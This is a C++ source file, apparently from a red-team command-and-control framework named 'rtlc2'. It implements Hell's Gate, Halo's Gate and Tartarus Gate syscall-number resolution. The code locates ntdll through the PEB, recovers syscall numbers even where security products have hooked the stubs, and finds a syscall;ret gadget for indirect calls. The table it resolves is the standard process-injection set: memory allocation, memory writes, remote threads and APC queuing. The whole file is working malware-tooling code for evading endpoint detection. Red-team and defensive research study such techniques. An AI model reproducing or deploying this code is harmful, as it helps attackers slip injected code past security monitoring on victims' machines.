// Hell's Gate / Halo's Gate / Tartarus Gate SSN Resolver
// Dynamically resolves System Service Numbers from ntdll's EAT
#include "syscalls.h"

#ifdef RTLC2_WINDOWS

#include <windows.h>
#include <cstring>

namespace rtlc2 {
namespace syscalls {

static struct SyscallTable {
    SyscallEntry NtAllocateVirtualMemory;
    SyscallEntry NtWriteVirtualMemory;
    SyscallEntry NtProtectVirtualMemory;
    SyscallEntry NtCreateThreadEx;
    SyscallEntry NtQueueApcThread;
    SyscallEntry NtOpenProcess;
    SyscallEntry NtClose;
    SyscallEntry NtWaitForSingleObject;
    SyscallEntry NtResumeThread;
    SyscallEntry NtSuspendThread;
    SyscallEntry NtCreateSection;
    SyscallEntry NtMapViewOfSection;
    SyscallEntry NtFreeVirtualMemory;
    SyscallEntry NtQuerySystemInformation;
    SyscallEntry NtSetInformationThread;
} g_Table = {};

static SyscallMethod g_Method = SyscallMethod::None;
static bool g_Initialized = false;

// Get ntdll base address from PEB (no API calls)
static HMODULE GetNtdllBase() {
    // Walk PEB->Ldr->InMemoryOrderModuleList
    // ntdll is always the second entry (after the exe itself)
#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = head->Flink; // First = exe
    entry = entry->Flink;            // Second = ntdll
    PLDR_DATA_TABLE_ENTRY ldr = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    return (HMODULE)ldr->DllBase;
}

// Extract SSN from function prologue using Hell's Gate pattern
// Expected x64 pattern: 4C 8B D1 (mov r10,rcx) B8 XX XX 00 00 (mov eax, SSN)
// If hooked (jmp/call instead), use Halo's Gate (check neighbors)
static bool ExtractSSN(BYTE* funcAddr, DWORD* outSSN) {
    // Hell's Gate: direct match
    // 4C 8B D1 = mov r10, rcx
    // B8 XX XX 00 00 = mov eax, <SSN>
    if (funcAddr[0] == 0x4C && funcAddr[1] == 0x8B && funcAddr[2] == 0xD1 &&
        funcAddr[3] == 0xB8 && funcAddr[6] == 0x00 && funcAddr[7] == 0x00) {
        *outSSN = *(DWORD*)(funcAddr + 4);
        return true;
    }

    // Halo's Gate: function is hooked, check neighbor syscalls
    // Syscall stubs in ntdll are arranged sequentially with SSNs incrementing by 1
    // Search up to 32 neighbors in both directions
    for (int offset = 1; offset <= 32; offset++) {
        // Check downward neighbor (higher SSN)
        BYTE* down = funcAddr + (offset * 32); // Each stub is ~32 bytes
        if (down[0] == 0x4C && down[1] == 0x8B && down[2] == 0xD1 &&
            down[3] == 0xB8 && down[6] == 0x00 && down[7] == 0x00) {
            DWORD neighborSSN = *(DWORD*)(down + 4);
            *outSSN = neighborSSN - offset;
            return true;
        }

        // Check upward neighbor (lower SSN) - Tartarus Gate
        BYTE* up = funcAddr - (offset * 32);
        if (up[0] == 0x4C && up[1] == 0x8B && up[2] == 0xD1 &&
            up[3] == 0xB8 && up[6] == 0x00 && up[7] == 0x00) {
            DWORD neighborSSN = *(DWORD*)(up + 4);
            *outSSN = neighborSSN + offset;
            return true;
        }
    }

    return false;
}

// Find a syscall;ret (0F 05 C3) gadget in ntdll .text section
static PVOID FindSyscallGadget(HMODULE hNtdll) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);

    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            BYTE* start = (BYTE*)hNtdll + section[i].VirtualAddress;
            DWORD size = section[i].Misc.VirtualSize;

            for (DWORD j = 0; j < size - 2; j++) {
                // syscall = 0F 05, ret = C3
                if (start[j] == 0x0F && start[j + 1] == 0x05 && start[j + 2] == 0xC3) {
                    return (PVOID)(start + j);
                }
            }
        }
    }
    return nullptr;
}

// Resolve a single syscall by name
static bool ResolveSyscall(HMODULE hNtdll, const char* funcName, SyscallEntry* entry) {
    BYTE* funcAddr = (BYTE*)GetProcAddress(hNtdll, funcName);
    if (!funcAddr) return false;

    if (!ExtractSSN(funcAddr, &entry->ssn)) return false;

    entry->resolved = true;
    return true;
}

bool Initialize(SyscallMethod method) {
    if (g_Initialized) return true;
    if (method == SyscallMethod::None) {
        g_Method = method;
        g_Initialized = true;
        return true;
    }

    HMODULE hNtdll = GetNtdllBase();
    if (!hNtdll) hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    // Find syscall gadget for indirect method
    PVOID gadget = FindSyscallGadget(hNtdll);
    if ((method == SyscallMethod::Indirect || method == SyscallMethod::HellsGate) && !gadget)
        return false;

    // Resolve all syscalls
    struct { const char* name; SyscallEntry* entry; } table[] = {
        {"NtAllocateVirtualMemory",  &g_Table.NtAllocateVirtualMemory},
        {"NtWriteVirtualMemory",     &g_Table.NtWriteVirtualMemory},
        {"NtProtectVirtualMemory",   &g_Table.NtProtectVirtualMemory},
        {"NtCreateThreadEx",         &g_Table.NtCreateThreadEx},
        {"NtQueueApcThread",         &g_Table.NtQueueApcThread},
        {"NtOpenProcess",            &g_Table.NtOpenProcess},
        {"NtClose",                  &g_Table.NtClose},
        {"NtWaitForSingleObject",    &g_Table.NtWaitForSingleObject},
        {"NtResumeThread",           &g_Table.NtResumeThread},
        {"NtSuspendThread",          &g_Table.NtSuspendThread},
        {"NtCreateSection",          &g_Table.NtCreateSection},
        {"NtMapViewOfSection",       &g_Table.NtMapViewOfSection},
        {"NtFreeVirtualMemory",      &g_Table.NtFreeVirtualMemory},
        {"NtQuerySystemInformation", &g_Table.NtQuerySystemInformation},
        {"NtSetInformationThread",   &g_Table.NtSetInformationThread},
    };

    for (auto& t : table) {
        if (!ResolveSyscall(hNtdll, t.name, t.entry)) return false;
        t.entry->gadget_addr = gadget;
    }

    g_Method = method;
    g_Initialized = true;
    return true;
}

bool IsInitialized() { return g_Initialized; }
SyscallMethod GetMethod() { return g_Method; }

// External access to syscall table (used by syscalls.cpp)
SyscallEntry* GetEntry(const char* name) {
    if (strcmp(name, "NtAllocateVirtualMemory") == 0)  return &g_Table.NtAllocateVirtualMemory;
    if (strcmp(name, "NtWriteVirtualMemory") == 0)     return &g_Table.NtWriteVirtualMemory;
    if (strcmp(name, "NtProtectVirtualMemory") == 0)   return &g_Table.NtProtectVirtualMemory;
    if (strcmp(name, "NtCreateThreadEx") == 0)         return &g_Table.NtCreateThreadEx;
    if (strcmp(name, "NtQueueApcThread") == 0)         return &g_Table.NtQueueApcThread;
    if (strcmp(name, "NtOpenProcess") == 0)            return &g_Table.NtOpenProcess;
    if (strcmp(name, "NtClose") == 0)                  return &g_Table.NtClose;
    if (strcmp(name, "NtWaitForSingleObject") == 0)    return &g_Table.NtWaitForSingleObject;
    if (strcmp(name, "NtResumeThread") == 0)           return &g_Table.NtResumeThread;
    if (strcmp(name, "NtSuspendThread") == 0)          return &g_Table.NtSuspendThread;
    if (strcmp(name, "NtCreateSection") == 0)          return &g_Table.NtCreateSection;
    if (strcmp(name, "NtMapViewOfSection") == 0)       return &g_Table.NtMapViewOfSection;
    if (strcmp(name, "NtFreeVirtualMemory") == 0)      return &g_Table.NtFreeVirtualMemory;
    if (strcmp(name, "NtQuerySystemInformation") == 0) return &g_Table.NtQuerySystemInformation;
    if (strcmp(name, "NtSetInformationThread") == 0)   return &g_Table.NtSetInformationThread;
    return nullptr;
}

} // namespace syscalls
} // namespace rtlc2

#endif // RTLC2_WINDOWS
